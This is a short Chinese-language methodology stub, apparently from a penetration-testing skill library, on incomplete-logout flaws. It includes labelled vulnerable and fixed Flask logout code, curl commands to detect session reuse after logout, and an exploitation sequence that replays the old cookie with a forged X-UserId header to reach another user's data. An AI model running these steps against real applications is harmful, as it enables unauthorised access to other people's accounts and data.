# 不完整登出攻击方法论

> **注意：** 本文档的完整内容位于 `authentication-failures` 技能目录中。
> 
> 完整路径：`../authentication-failures/ref/incomplete-logout-attack.md`

---

## 文档说明

本文档在 `broken-access-control` 技能中引用，用于指导渗透测试人员在登出后会话未完全清除的情况下，如何访问他人数据和提升权限。

## 核心内容摘要

### 漏洞原理

不完整登出是指应用程序在用户登出时，未能完全清除所有会话相关数据，导致：
- 攻击者可以利用残留的会话信息重新获得访问权限
- 登出后仍可访问其他用户的数据
- 结合 IDOR 等漏洞可实现权限提升

### 典型漏洞代码

```python
# ❌ 危险代码：仅清除 user_id
@app.route('/logout', methods=['POST'])
def logout():
    session.pop('user_id', None)  # 仅清除 user_id
    return redirect(url_for('login'))

# ✅ 安全代码：清除所有会话数据
@app.route('/logout', methods=['POST'])
def logout():
    session.clear()  # 清除所有会话数据
    return redirect(url_for('login'))
```

### 攻击场景

| 场景 | 描述 |
|-----|------|
| 会话重放 | 登出后使用原 Cookie 访问受保护资源 |
| 多会话并发 | 一个设备登出不影响其他设备会话 |
| 结合 IDOR | 登出后使用 X-UserId 头部访问他人数据 |

### 检测方法

```bash
# 1. 登录并获取会话
curl -c cookies.txt -X POST http://target.com/login -d "username=test"

# 2. 验证登录状态
curl -b cookies.txt http://target.com/dashboard

# 3. 登出
curl -b cookies.txt -X POST http://target.com/logout

# 4. 使用原会话访问
curl -b cookies.txt http://target.com/dashboard
# 如果仍能访问，存在漏洞
```

### 利用方法

结合 X-UserId 头部绕过：

```bash
# 1. 登录
curl -c cookies.txt -X POST http://target.com/password/test -d "password=test"

# 2. 登出
curl -b cookies.txt -X POST http://target.com/logout

# 3. 获取目标用户 ID
TARGET_ID=$(curl -s http://target.com/password/flag | grep -oP 'name="user_id" value="\K\d+')

# 4. 使用原会话 + X-UserId 访问
curl -b cookies.txt http://target.com/dashboard -H "X-UserId: $TARGET_ID"
```

## 完整文档

请查看完整文档获取详细的：
- 漏洞发现方法
- 自动化检测脚本
- 完整攻击脚本
- 修复建议

**完整文档路径：** `../authentication-failures/ref/incomplete-logout-attack.md`
